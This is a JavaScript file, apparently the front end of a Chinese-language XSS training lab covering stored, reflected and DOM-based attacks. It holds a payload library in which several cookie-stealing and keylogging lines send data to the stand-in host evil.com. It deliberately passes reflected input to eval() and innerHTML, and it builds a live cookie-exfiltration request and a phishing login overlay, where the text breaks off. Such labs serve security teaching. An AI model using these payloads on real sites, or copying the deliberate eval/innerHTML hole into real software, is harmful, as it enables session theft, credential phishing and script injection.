/**
 * XSS漏洞测试平台JavaScript逻辑
 * 实现存储型、反射型、DOM型XSS测试功能
 */

// 全局配置
const XSS_CONFIG = {
    ENDPOINTS: {
        STORAGE_SUBMIT: '/target/xss/submit-comment',
        STORAGE_SAFE_SUBMIT: '/target/xss/safe-submit-comment',
        STORAGE_LIST: '/target/xss/list-comments',
        REFLECTIVE_SEARCH: '/target/xss/search',
        DOM_PROFILE: '/target/xss/profile'
    },
    SELECTORS: {
        COMMENT_INPUT: '#commentInput',
        SEARCH_KEYWORD: '#searchKeyword',
        USERNAME_INPUT: '#usernameInput',
        VULN_COMMENT_BTN: '#vulnCommentBtn',
        SAFE_COMMENT_BTN: '#safeCommentBtn',
        VIEW_COMMENTS_BTN: '#viewCommentsBtn',
        REFLECTIVE_SEARCH_BTN: '#reflectiveSearchBtn',
        DOM_PROFILE_BTN: '#domProfileBtn',
        OUTPUT_CONTAINER: '#outputContainer',
        STATUS_INDICATOR: '#statusIndicator',
        LOADING_OVERLAY: '#loadingOverlay'
    }
};

// XSS测试用例库
const XSS_TEST_CASES = {
    storage: {
        basic: "<script>alert('存储型XSS触发')</script>",
        cookie: "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
        phishing: "<script>alert('会话过期，请重新登录：'+prompt('用户名：')+prompt('密码：'))</script>",
        img: "<img src=x onerror=alert('img标签XSS')>",
        domain: "<script>alert(document.domain)</script>",
        pageHijack: "<script>document.body.innerHTML='<h1>页面被XSS劫持！</h1>'</script>",
        keylogger: "<script>document.onkeydown=function(e){new Image().src='http://evil.com/key?k='+e.key}</script>",
        svg: "<svg onload=alert('svg标签XSS')>"
    },
    reflective: {
        basic: "<script>alert('反射型XSS')</script>",
        cookie: "<script>new Image().src='http://evil.com/steal?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href)</script>",
        bypass: "</div><script>alert('闭合标签绕过')</script>",
        mixedCase: "<ScRiPt>alert('大小写混合')</ScRiPt>",
        commentBypass: "<script>alert/*注释*/('注释绕过')</script>",
        showKeyword: "<script>alert('你搜索的是：'+location.href.split('keyword=')[1])</script>"
    },
    dom: {
        basic: "<script>alert('DOM型XSS基础攻击触发！')</script>",
        img: "<img src=x onerror=alert('DOM-img标签攻击触发！')>",
        input: "<input autofocus onfocus=alert('DOM-focus自动聚焦攻击触发！')>",
        svg: "<svg onload=alert('DOM-svg标签攻击触发！')></svg>",
        link: "<a href=\"javascript:alert('DOM-link攻击触发！')\">点击触发XSS</a>",
        iframe: "<iframe src=\"javascript:alert('DOM-iframe攻击触发！')\" width=0 height=0></iframe>",
        cookieSteal: "<script>new Image().src='http://evil.com/?cookie='+document.cookie</script>",
        redirect: "<script>location.href='http://evil.com/'</script>",
        linkHijack: "<a href=\"javascript:alert('DOM-link')\">点我</a>"
    }
};

// 页面加载完成后初始化
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

/**
 * 应用初始化函数
 */
function initializeApp() {
    bindEventListeners();
    updateStatus('ready', '就绪');
    console.log('XSS漏洞测试平台初始化完成');
}

/**
 * 绑定事件监听器
 */
function bindEventListeners() {
    // 存储型XSS按钮
    document.querySelector(XSS_CONFIG.SELECTORS.VULN_COMMENT_BTN)
        ?.addEventListener('click', () => executeStorageXss('vuln'));
        
    document.querySelector(XSS_CONFIG.SELECTORS.SAFE_COMMENT_BTN)
        ?.addEventListener('click', () => executeStorageXss('safe'));
        
    document.querySelector(XSS_CONFIG.SELECTORS.VIEW_COMMENTS_BTN)
        ?.addEventListener('click', viewComments);

    // 反射型XSS按钮
    document.querySelector(XSS_CONFIG.SELECTORS.REFLECTIVE_SEARCH_BTN)
        ?.addEventListener('click', executeReflectiveXss);

    // DOM型XSS按钮
    document.querySelector(XSS_CONFIG.SELECTORS.DOM_PROFILE_BTN)
        ?.addEventListener('click', executeDomXss);

    // 回车键执行
    document.querySelector(XSS_CONFIG.SELECTORS.COMMENT_INPUT)
        ?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && e.ctrlKey) executeStorageXss('vuln');
        });
        
    document.querySelector(XSS_CONFIG.SELECTORS.SEARCH_KEYWORD)
        ?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') executeReflectiveXss();
        });
        
    document.querySelector(XSS_CONFIG.SELECTORS.USERNAME_INPUT)
        ?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') executeDomXss();
        });

    // 输出容器自动滚动
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (outputContainer) {
        new MutationObserver(() => {
            outputContainer.scrollTop = outputContainer.scrollHeight;
        }).observe(outputContainer, { childList: true, subtree: true });
    }
}

/**
 * 执行存储型XSS测试
 * @param {'vuln'|'safe'} testType 测试类型
 */
async function executeStorageXss(testType) {
    const commentInput = document.querySelector(XSS_CONFIG.SELECTORS.COMMENT_INPUT);
    const commentContent = commentInput?.value.trim();

    if (!commentContent) {
        showNotification('请输入评论内容', 'warning');
        commentInput?.focus();
        return;
    }

    const startTime = performance.now();
    showLoading(true);
    updateStatus('executing', '提交中...');

    try {
        const endpoint = testType === 'vuln' 
            ? XSS_CONFIG.ENDPOINTS.STORAGE_SUBMIT 
            : XSS_CONFIG.ENDPOINTS.STORAGE_SAFE_SUBMIT;
            
        const response = await sendPostRequest(endpoint, { content: commentContent });
        const responseTime = ((performance.now() - startTime) / 1000).toFixed(2);
        
        handleStorageResponse(commentContent, response, testType, responseTime);
        showNotification(`${testType === 'vuln' ? '恶意' : '安全'}评论提交成功`, 'success');
        
    } catch (error) {
        console.error('存储型XSS测试错误:', error);
        showNotification(`提交失败: ${error.message}`, 'error');
    } finally {
        showLoading(false);
        updateStatus('ready', '就绪');
    }
}

/**
 * 查看评论列表（触发存储型XSS）
 */
async function viewComments() {
    const startTime = performance.now();
    showLoading(true);
    updateStatus('executing', '加载中...');

    try {
        const response = await sendGetRequest(XSS_CONFIG.ENDPOINTS.STORAGE_LIST);
        const responseTime = ((performance.now() - startTime) / 1000).toFixed(2);
        
        displayComments(response, responseTime);
        showNotification('评论列表加载成功', 'success');
        
        // 模拟XSS触发效果
        simulateXssTrigger(response);
        
    } catch (error) {
        console.error('查看评论错误:', error);
        showNotification(`加载失败: ${error.message}`, 'error');
    } finally {
        showLoading(false);
        updateStatus('ready', '就绪');
    }
}

/**
 * 执行反射型XSS测试
 */
async function executeReflectiveXss() {
    const keywordInput = document.querySelector(XSS_CONFIG.SELECTORS.SEARCH_KEYWORD);
    const keyword = keywordInput?.value.trim();

    if (!keyword) {
        showNotification('请输入搜索关键词', 'warning');
        keywordInput?.focus();
        return;
    }

    const encodedKeyword = encodeURIComponent(keyword);
    const startTime = performance.now();
    showLoading(true);
    updateStatus('executing', '搜索中...');

    try {
        const response = await sendGetRequest(
            `${XSS_CONFIG.ENDPOINTS.REFLECTIVE_SEARCH}?keyword=${encodedKeyword}`
        );
        const responseTime = ((performance.now() - startTime) / 1000).toFixed(2);
        
        handleReflectiveResponse(keyword, response, responseTime);
        showNotification('反射搜索完成', 'success');
        
    } catch (error) {
        console.error('反射型XSS测试错误:', error);
        showNotification(`搜索失败: ${error.message}`, 'error');
    } finally {
        showLoading(false);
        updateStatus('ready', '就绪');
    }
}

/**
 * 执行DOM型XSS测试
 */
async function executeDomXss() {
    const usernameInput = document.querySelector(XSS_CONFIG.SELECTORS.USERNAME_INPUT);
    const username = usernameInput?.value.trim();

    if (!username) {
        showNotification('请输入用户名', 'warning');
        usernameInput?.focus();
        return;
    }

    // 对用户名进行双重编码以避免JSON解析错误
    const encodedUsername = encodeURIComponent(encodeURIComponent(username));
    const startTime = performance.now();
    showLoading(true);
    updateStatus('executing', '加载中...');

    try {
        const response = await sendGetRequest(
            `${XSS_CONFIG.ENDPOINTS.DOM_PROFILE}?username=${encodedUsername}`
        );
        const responseTime = ((performance.now() - startTime) / 1000).toFixed(2);
        
        handleDomResponse(username, response, responseTime);
        showNotification('用户资料加载成功', 'success');
        
    } catch (error) {
        console.error('DOM型XSS测试错误:', error);
        showNotification(`加载失败: ${error.message}`, 'error');
    } finally {
        showLoading(false);
        updateStatus('ready', '就绪');
    }
}

/**
 * 发送POST请求
 * @param {string} url 请求URL
 * @param {Object} data 请求数据
 * @returns {Promise<Object>} 响应数据
 */
async function sendPostRequest(url, data) {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(data),
        credentials: 'same-origin'
    });

    if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    return await response.json();
}

/**
 * 发送GET请求
 * @param {string} url 请求URL
 * @returns {Promise<Object>} 响应数据
 */
async function sendGetRequest(url) {
    const response = await fetch(url, {
        method: 'GET',
        headers: {
            'Accept': 'application/json'
        },
        credentials: 'same-origin'
    });

    if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    return await response.json();
}

/**
 * 处理存储型XSS响应
 */
function handleStorageResponse(content, response, testType, responseTime) {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;

    outputContainer.querySelector('.welcome-message')?.remove();

    const resultHtml = `
        <div class="query-result">
            <div class="query-header">
                <div>
                    <span class="query-type ${testType === 'vuln' ? 'vuln' : 'safe'}">
                        ${testType === 'vuln' ? '存储型XSS' : '安全防护'}
                    </span>
                    <span class="ms-2">测试类型: ${testType === 'vuln' ? '漏洞测试' : '防护测试'}</span>
                    <span class="ms-3 badge bg-info">耗时: ${responseTime}秒</span>
                </div>
                <div class="query-timestamp">${new Date().toLocaleString('zh-CN')}</div>
            </div>
            <div class="query-input">
                <i class="fas fa-comment me-2"></i>提交内容: ${escapeHtml(content)}
            </div>
            <div class="search-response">
                <strong>服务器响应:</strong><br>
                ${JSON.stringify(response, null, 2)}
            </div>
            ${testType === 'vuln' ? 
                `<div class="xss-warning">
                    <i class="fas fa-exclamation-triangle me-2"></i>
                    <strong>安全警告:</strong> 恶意内容已存入数据库，所有查看评论的用户都将触发XSS攻击！
                </div>` : 
                `<div class="security-success">
                    <i class="fas fa-shield-alt me-2"></i>
                    <strong>安全防护:</strong> 内容已进行HTML转义处理，有效防护存储型XSS攻击
                </div>`
            }
        </div>
    `;

    outputContainer.insertAdjacentHTML('beforeend', resultHtml);
}

/**
 * 显示评论列表
 */
function displayComments(response, responseTime) {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;

    outputContainer.querySelector('.welcome-message')?.remove();

    let commentsHtml = '';
    let xssEffects = [];
    
    if (response.data && response.data.comment_list) {
        commentsHtml = response.data.comment_list.map((comment, index) => {
            const isXss = isXssContent(comment.content);
            if (isXss) {
                // 记录不同类型的XSS效果
                const effectType = getXssEffectType(comment.content);
                xssEffects.push({type: effectType, content: comment.content, index: index});
            }
            
            return `
            <div class="comment-item">
                <div class="comment-header">
                    <span class="comment-index badge bg-primary me-2">#${index + 1}</span>
                    <span class="comment-user">${escapeHtml(comment.user || '匿名用户')}</span>
                    <span class="comment-time">${new Date(parseInt(comment.create_time)).toLocaleString('zh-CN')}</span>
                </div>
                <div class="comment-content ${isXss ? 'xss-trigger' : ''}" data-comment-index="${index}">
                    ${isXss ? 
                        `<div class="xss-attack-info">
                            <span class="attack-type-badge badge bg-danger me-2">${getXssAttackTypeLabel(comment.content)}</span>
                            <span class="attack-description">恶意XSS脚本内容（已阻止执行）</span>
                        </div>
                        <div class="xss-script-preview mt-2 p-2 bg-light rounded">
                            ${escapeHtml(comment.content)}
                        </div>` : 
                        escapeHtml(comment.content)
                    }
                </div>
            </div>
        `}).join('');
    }

    const resultHtml = `
        <div class="query-result">
            <div class="query-header">
                <div>
                    <span class="query-type vuln">存储型XSS</span>
                    <span class="ms-2">评论列表展示</span>
                    <span class="ms-3 badge bg-info">耗时: ${responseTime}秒</span>
                </div>
                <div class="query-timestamp">${new Date().toLocaleString('zh-CN')}</div>
            </div>
            <div class="comment-list">
                <h6><i class="fas fa-comments me-2"></i>评论列表 (${response.data?.comment_list?.length || 0} 条):</h6>
                ${commentsHtml || '<div class="alert alert-info">暂无评论</div>'}
            </div>
            <div class="xss-warning">
                <i class="fas fa-exclamation-triangle me-2"></i>
                <strong>⚠️ 存储型XSS风险:</strong> 如上所示，数据库中的恶意脚本将在页面渲染时执行！
            </div>
        </div>
    `;

    outputContainer.insertAdjacentHTML('beforeend', resultHtml);
    
    // 为不同类型的XSS内容显示不同的效果
    if (xssEffects.length > 0) {
        setTimeout(() => {
            xssEffects.forEach((effect, idx) => {
                setTimeout(() => {
                    simulateSpecificXssEffect(effect.type, effect.index);
                }, idx * 1500); // 间隔1.5秒显示不同效果
            });
        }, 1000);
    }
}

/**
 * 处理反射型XSS响应
 */
function handleReflectiveResponse(keyword, response, responseTime) {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;

    outputContainer.querySelector('.welcome-message')?.remove();

    // 更安全的关键词显示方式
    const safeKeyword = escapeHtml(keyword).replace(/\n/g, '\n').replace(/\r/g, '\r');
    
    // 检查响应中是否包含XSS脚本并准备执行
    let xssScript = '';
    let xssSourceField = '';
    
    if (response.data) {
        // 从keyword字段中提取XSS脚本（反射型XSS的核心）
        if (response.data.keyword) {
            const keywordContent = response.data.keyword;
            if (keywordContent.includes('<script>') || 
                keywordContent.includes('onerror') || 
                keywordContent.includes('onload') ||
                keywordContent.includes('javascript:') ||
                keywordContent.includes('eval(') ||
                keywordContent.includes('document.cookie') ||
                keywordContent.includes('alert(')) {
                xssScript = keywordContent;
                xssSourceField = 'keyword';
            }
        }
        
        // 也检查tip字段作为备选
        if (!xssScript && response.data.tip) {
            const tipContent = response.data.tip;
            if (tipContent.includes('<script>') || 
                tipContent.includes('onerror') || 
                tipContent.includes('onload') ||
                tipContent.includes('javascript:') ||
                tipContent.includes('eval(') ||
                tipContent.includes('document.cookie') ||
                tipContent.includes('alert(')) {
                xssScript = tipContent;
                xssSourceField = 'tip';
            }
        }
        
        // 如果仍然没有找到，检查整个响应数据中是否包含XSS特征
        if (!xssScript) {
            const responseString = JSON.stringify(response.data);
            if (responseString.includes('<script>') || 
                responseString.includes('onerror') || 
                responseString.includes('onload') ||
                responseString.includes('javascript:') ||
                responseString.includes('eval(') ||
                responseString.includes('document.cookie') ||
                responseString.includes('alert(')) {
                // 尝试从原始keyword参数重建XSS脚本
                xssScript = keyword;
                xssSourceField = 'reconstructed';
            }
        }
    }
    
    const resultHtml = `
        <div class="query-result" id="reflective-result-${Date.now()}">
            <div class="query-header">
                <div>
                    <span class="query-type reflective">反射型XSS</span>
                    <span class="ms-2">搜索测试</span>
                    <span class="ms-3 badge bg-info">耗时: ${responseTime}秒</span>
                </div>
                <div class="query-timestamp">${new Date().toLocaleString('zh-CN')}</div>
            </div>
            <div class="query-content">
                <div class="search-keyword">
                    <i class="fas fa-search me-2"></i>搜索关键词: <span class="keyword-display">${safeKeyword}</span>
                </div>
                <div class="search-response">
                    <strong>服务器响应:</strong><br>
                    <pre>${escapeHtml(JSON.stringify(response, null, 2))}</pre>
                </div>
                <div class="xss-demo-area" style="margin-top: 15px; padding: 15px; background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 4px;">
                    <strong>🔄 XSS执行演示区:</strong><br>
                    ${xssScript ? 
                        `<div id="xss-demo-content-${Date.now()}" style="margin-top: 10px; padding: 10px; background: #ffffff; border: 1px dashed #ff9800; border-radius: 4px;">
                            <div style="margin-bottom: 8px; font-size: 12px; color: #666;">
                                检测源: ${xssSourceField || '未知'} | 脚本长度: ${xssScript.length} 字符
                            </div>
                            <div style="font-family: 'Courier New', monospace; font-size: 13px; white-space: pre-wrap; word-break: break-all;">
${escapeHtml(xssScript)}</div>
                        </div>` : 
                        `<div style="margin-top: 10px; padding: 10px; background: #f8f9fa; border: 1px dashed #ccc; border-radius: 4px; color: #666; text-align: center;">
                            未检测到XSS脚本内容<br>
                            <small>请输入包含&lt;script&gt;、onerror、onload等XSS特征的测试用例</small>
                        </div>`
                    }
                </div>
                <div class="xss-warning">
                    <i class="fas fa-bolt me-2"></i>
                    <strong>⚠️ 反射型XSS风险:</strong> URL参数未经转义直接返回，可在响应中触发XSS攻击！
                </div>
            </div>
        </div>
    `;

    outputContainer.insertAdjacentHTML('beforeend', resultHtml);
    
    // 如果有XSS脚本，立即执行以确保攻击效果
    if (xssScript) {
        setTimeout(() => {
            try {
                // 检查是否为Cookie窃取脚本
                if (xssScript.includes('new Image') && xssScript.includes('document.cookie')) {
                    // 模拟DOM型XSS的Cookie窃取三步弹窗效果
                    simulateReflectiveCookieStealAttack(xssScript);
                } else {
                    // 处理其他类型的XSS脚本
                    let attackExecuted = false;
                    
                    // 处理<script>标签
                    if (xssScript.includes('<script>')) {
                        const scriptMatch = xssScript.match(/<script>(.*?)<\/script>/i);
                        if (scriptMatch) {
                            const scriptContent = scriptMatch[1];
                            if (scriptContent.includes('alert')) {
                                const alertMatch = scriptContent.match(/alert\(['"](.*?)['"]\)/);
                                if (alertMatch) {
                                    alert(alertMatch[1]);
                                    attackExecuted = true;
                                }
                            } else {
                                // 执行其他JavaScript代码
                                eval(scriptContent);
                                attackExecuted = true;
                            }
                        }
                    }
                    
                    // 处理javascript:协议
                    if (xssScript.includes('javascript:') && !attackExecuted) {
                        const jsMatch = xssScript.match(/javascript:(.*)/i);
                        if (jsMatch) {
                            eval(jsMatch[1]);
                            attackExecuted = true;
                        }
                    }
                    
                    // 处理事件处理器
                    if ((xssScript.includes('onerror') || xssScript.includes('onload')) && !attackExecuted) {
                        // 创建临时元素触发事件
                        const tempElement = document.createElement('img');
                        tempElement.src = 'invalid-source';
                        tempElement.setAttribute('onerror', "alert('反射型XSS - 图片错误触发')");
                        document.body.appendChild(tempElement);
                        setTimeout(() => {
                            if (tempElement.parentElement) {
                                tempElement.remove();
                            }
                        }, 100);
                        attackExecuted = true;
                    }
                    
                    // 如果以上都没匹配，尝试直接执行
                    if (!attackExecuted) {
                        // 创建临时div来执行脚本
                        const tempDiv = document.createElement('div');
                        tempDiv.innerHTML = xssScript;
                        document.body.appendChild(tempDiv);
                        
                        // 移除临时元素
                        setTimeout(() => {
                            if (tempDiv.parentElement) {
                                tempDiv.remove();
                            }
                        }, 100);
                    }
                    
                    // 显示执行提示
                    showNotification('反射型XSS脚本已执行！', 'warning');
                }
                
                // 在当前查询结果内显示攻击详情
                // 获取最新创建的反射型结果元素
                const allReflectiveResults = document.querySelectorAll('[id^="reflective-result-"]');
                const currentResult = allReflectiveResults[allReflectiveResults.length - 1]; // 选择最后一个（最新的）
                if (currentResult) {
                    const attackInfoHtml = `
                        <div class="attack-info-section mt-3 pt-3 border-top">
                            <h5 class="mb-3"><i class="fas fa-bolt me-2 text-warning"></i>反射型XSS攻击详情</h5>
                            <div class="attack-details-grid">
                                <div class="detail-item">
                                    <span class="detail-label">攻击类型：</span>
                                    <span class="detail-value badge bg-warning">反射型XSS</span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">恶意脚本：</span>
                                    <span class="detail-value">
                                        <code class="malicious-script">${escapeHtml(xssScript.substring(0, 100))}${xssScript.length > 100 ? '...' : ''}</code>
                                    </span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">触发方式：</span>
                                    <span class="detail-value">URL参数反射执行</span>
                                </div>
                                <div class="detail-item">
                                    <span class="detail-label">危害等级：</span>
                                    <span class="detail-value text-danger">⚠️ 高危</span>
                                </div>
                                <div class="detail-item full-width">
                                    <span class="detail-label">攻击请求：</span>
                                    <span class="detail-value text-muted">GET /target/xss/search?keyword=${encodeURIComponent(keyword)}</span>
                                </div>
                                <div class="detail-item full-width">
                                    <span class="detail-label">安全提示：</span>
                                    <span class="detail-value text-muted">💡 这是真实的反射型XSS攻击场景演示。攻击者通过构造恶意URL参数来触发攻击。</span>
                                </div>
                            </div>
                        </div>
                    `;
                    currentResult.querySelector('.query-content').insertAdjacentHTML('beforeend', attackInfoHtml);
                }
                
            } catch (e) {
                console.log('XSS脚本执行异常:', e.message);
                // 即使执行失败也显示模拟效果
                simulateXssEffect(`反射型XSS攻击触发！恶意脚本: ${xssScript.substring(0, 50)}...`);
            }
        }, 800);
    }
}

/**
 * 处理DOM型XSS响应
 */
function handleDomResponse(username, response, responseTime) {
    const outputContainer = document.querySelector(XSS_CONFIG.SELECTORS.OUTPUT_CONTAINER);
    if (!outputContainer) return;

    outputContainer.querySelector('.welcome-message')?.remove();

    // 解码URL编码的用户名
    const decodedUsername = decodeURIComponent(username);
    
    // 构建用户资料HTML（模拟后端返回的HTML片段）
    const profileHtml = `<div class="profile"><h3>用户资料</h3><p>用户名：${decodedUsername}</p></div>`;
    
    // 检测是否包含XSS内容
    const isXssTrigger = isXssContent(decodedUsername);
    const resultId = `dom-result-${Date.now()}`;

    const resultHtml = `
        <div class="query-result" id="${resultId}">
            <div class="query-header">
                <div>
                    <span class="query-type dom">DOM型XSS</span>
                    <span class="ms-2">用户资料</span>
                    <span class="ms-3 badge bg-info">耗时: ${responseTime}秒</span>
                </div>
                <div class="query-timestamp">${new Date().toLocaleString('zh-CN')}</div>
            </div>
            <div class="profile-container">
                <div class="profile-header">
                    <h4><i class="fas fa-user-circle me-2"></i>用户资料</h4>
                </div>
                <div class="profile-content ${isXssTrigger ? 'xss-trigger' : ''}" id="profile-content-${resultId}">
                    <!-- 这里将动态插入用户资料内容 -->
                </div>
            </div>
            <div class="xss-warning">
                <i class="fas fa-code me-2"></i>
                <strong>⚠️ DOM型XSS风险:</strong> 后端返回的HTML片段在前端渲染时可能执行恶意脚本！
            </div>
        </div>
    `;

    outputContainer.insertAdjacentHTML('beforeend', resultHtml);

    // 获取刚创建的profile内容区域
    const profileContent = document.getElementById(`profile-content-${resultId}`);
    if (!profileContent) return;

    // 模拟真实的DOM型XSS攻击过程
    setTimeout(() => {
        if (isXssTrigger) {
            // 真实场景：前端直接将后端返回的HTML插入DOM
            try {
                // 直接设置innerHTML，这会执行其中的脚本
                profileContent.innerHTML = profileHtml;
                
                // 显示执行提示
                showNotification('DOM型XSS脚本已执行！', 'warning');
                
                // 模拟攻击效果
                simulateDomXssAttack(decodedUsername);
                
            } catch (e) {
                console.log('DOM XSS执行异常:', e.message);
                // 如果真实执行失败，则显示模拟效果
                simulateXssEffect(`DOM型XSS攻击触发！恶意脚本: ${decodedUsername.substring(0, 50)}...`);
            }
        } else {
            // 正常情况：安全显示用户资料
            profileContent.innerHTML = profileHtml;
            showNotification('用户资料加载成功', 'success');
        }
    }, 600);
}

/**
 * 检测是否为XSS内容
 * @param {string} content 内容
 * @returns {boolean} 是否包含XSS特征
 */
function isXssContent(content) {
    if (!content) return false;
    
    const xssPatterns = [
        /<script[^>]*>.*?<\/script>/gi,
        /on\w+\s*=/gi,
        /javascript:/gi,
        /<img[^>]*\s+onerror\s*=/gi,
        /<svg[^>]*\s+onload\s*=/gi,
        /<iframe[^>]*\s+src\s*=\s*["']javascript:/gi
    ];
    
    return xssPatterns.some(pattern => pattern.test(content));
}

/**
 * 获取XSS效果类型
 * @param {string} content XSS内容
 * @returns {string} 效果类型
 */
function getXssEffectType(content) {
    if (!content) return 'basic';
    
    if ((content.includes('alert') && content.includes('document.cookie')) || 
        (content.includes('new Image') && content.includes('document.cookie')) ||
        (content.includes('src=') && content.includes('document.cookie'))) {
        return 'cookie';
    } else if (content.includes('prompt') && content.includes('登录')) {
        return 'phishing';
    } else if (content.includes('<img') && content.includes('onerror')) {
        return 'img';
    } else if (content.includes('<svg') && content.includes('onload')) {
        return 'svg';
    } else if (content.includes('document.body.innerHTML')) {
        return 'pageHijack';
    } else {
        return 'basic';
    }
}

/**
 * 获取XSS攻击类型标签文本
 * @param {string} content XSS内容
 * @returns {string} 攻击类型标签
 */
function getXssAttackTypeLabel(content) {
    const effectType = getXssEffectType(content);
    const typeLabels = {
        'basic': '基础弹窗攻击',
        'cookie': 'Cookie窃取攻击',
        'phishing': '钓鱼攻击',
        'img': '图片标签攻击',
        'svg': 'SVG标签攻击',
        'pageHijack': '页面劫持攻击'
    };
    return typeLabels[effectType] || '未知攻击类型';
}

/**
 * 模拟XSS触发效果
 */
function simulateXssTrigger(response) {
    if (response.data?.comment_list) {
        const hasXss = response.data.comment_list.some(comment => 
            isXssContent(comment.content)
        );
        
        if (hasXss) {
            setTimeout(() => {
                simulateXssEffect('存储型XSS攻击触发！');
            }, 1000);
        }
    }
}

/**
 * 模拟XSS弹窗效果
 * @param {string} message 提示信息
 */
function simulateXssEffect(message) {
    // 使用浏览器原生alert模拟真实XSS攻击效果
    alert(`⚠️ XSS攻击警告

${message}

在真实环境中，这将是恶意脚本的实际执行效果！`);
}

/**
 * 模拟DOM型XSS攻击效果
 * @param {string} maliciousScript 恶意脚本内容
 */
function simulateDomXssAttack(maliciousScript) {
    // 分析恶意脚本类型并执行相应效果
    let attackMessage = 'DOM型XSS攻击触发！';
    
    if (maliciousScript.includes('alert')) {
        attackMessage = '弹窗攻击';
        // 实际执行alert
        try {
            // 提取alert中的消息内容
            const alertMatch = maliciousScript.match(/alert\(['"]([^'"]*)['"]\)/);
            if (alertMatch) {
                alert(alertMatch[1]);
            } else {
                alert('XSS攻击触发！');
            }
        } catch (e) {
            console.log('Alert执行模拟');
        }
    } else if (maliciousScript.includes('onfocus')) {
        attackMessage = '自动聚焦攻击';
        // 创建可聚焦元素并触发focus事件
        const focusElement = document.createElement('input');
        focusElement.setAttribute('autofocus', '');
        focusElement.setAttribute('onfocus', "alert('DOM-focus攻击触发！')");
        document.body.appendChild(focusElement);
        focusElement.focus();
        setTimeout(() => {
            if (focusElement.parentElement) {
                focusElement.remove();
            }
        }, 100);
    } else if (maliciousScript.includes('onerror')) {
        attackMessage = '图片错误攻击';
        // 创建错误图片触发onerror
        const imgElement = document.createElement('img');
        imgElement.src = 'nonexistent.jpg';
        imgElement.setAttribute('onerror', "alert('img标签XSS攻击触发！')");
        document.body.appendChild(imgElement);
        setTimeout(() => {
            if (imgElement.parentElement) {
                imgElement.remove();
            }
        }, 100);
    } else if (maliciousScript.includes('<svg') && maliciousScript.includes('onload')) {
        attackMessage = 'SVG加载攻击';
        // 创建SVG元素触发onload
        const svgElement = document.createElement('svg');
        svgElement.setAttribute('onload', "alert('SVG标签XSS攻击触发！')");
        document.body.appendChild(svgElement);
        setTimeout(() => {
            if (svgElement.parentElement) {
                svgElement.remove();
            }
        }, 100);
    } else if (maliciousScript.includes('new Image') && maliciousScript.includes('document.cookie')) {
        attackMessage = 'Cookie窃取攻击';
        // 模拟真实的Cookie窃取攻击
        const stolenCookie = getStolenCookie();
        
        // 创建窃取Cookie的图片请求
        const imgElement = document.createElement('img');
        imgElement.src = `http://evil.com/steal?cookie=${encodeURIComponent(stolenCookie)}&url=${encodeURIComponent(window.location.href)}`;
        imgElement.style.display = 'none';
        document.body.appendChild(imgElement);
        
        // 显示窃取警告
        let cookieMessage = '';
        if (stolenCookie === '(当前页面无 Cookie)') {
            cookieMessage = `当前页面无 Cookie。

提示：你可以点击"设置测试 Cookie"按钮，或在浏览器控制台手动设置 Cookie 后再测试。`;
        } else {
            cookieMessage = `攻击者已窃取您的 Cookie 信息：
${stolenCookie}`;
        }
        
        alert(`⚠️ Cookie窃取攻击演示

${cookieMessage}

在真实攻击中，这些敏感信息会被发送到恶意服务器。`);
        
        // 延迟跳转到恶意网站
        setTimeout(() => {
            alert('⚠️ Cookie窃取完成，即将跳转到恶意网站...\n\n在真实环境中，攻击者会利用您的被盗Cookie进行进一步攻击。');
            window.location.href = 'http://evil.com/';
        }, 2000);
        
        // 清理临时元素
        setTimeout(() => {
            if (imgElement.parentElement) {
                imgElement.remove();
            }
        }, 100);
    } else if (maliciousScript.includes('<a href="javascript:') && maliciousScript.includes('点我')) {
        attackMessage = '链接劫持攻击';
        // 创建可点击的链接元素
        const linkElement = document.createElement('a');
        linkElement.href = 'javascript:alert("DOM-link")';
        linkElement.innerHTML = '点我';
        linkElement.style.cssText = 'color: #007bff; text-decoration: underline; cursor: pointer; margin: 10px; display: inline-block;';
        document.body.appendChild(linkElement);
        
        // 添加点击事件监听
        linkElement.addEventListener('click', function(e) {
            e.preventDefault();
            alert('DOM-link');
            // 移除临时元素
            setTimeout(() => {
                if (linkElement.parentElement) {
                    linkElement.remove();
                }
            }, 100);
        });
        
        // 显示提示
        alert('⚠️ 链接劫持攻击演示\n\n页面中已注入恶意链接，点击"点我"将触发XSS攻击。\n\n在真实环境中，攻击者会通过伪装的链接窃取用户信息。');
    } else if (maliciousScript.includes('prompt') && maliciousScript.includes('登录')) {
        attackMessage = '钓鱼攻击';
        // 创建更真实的钓鱼表单（替代简单的prompt）
        const phishingForm = document.createElement('div');
        phishingForm.id = 'dom-phishing-form-' + Date.now();
        phishingForm.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border: 2px solid #dc3545;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            z-index: 10000;
            min-width: 400px;
            font-family: Arial, sans-serif;
        `;
        
        phishingForm.innerHTML = `
            <div style="text-align: center; margin-bottom: 20px;">
                <h3 style="color: #dc3545; margin: 0;">🔒 会话过期</h3>
                <p style="color: #666; margin: 10px 0 0 0;">为了您的账户安全，请重新登录</p>
            </div>
            <form id="dom-phishing-login-form" style="margin-bottom: 20px;">
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; font-weight: bold;">👤 用户名:</label>
                    <input type="text" id="dom-phishing-username" 
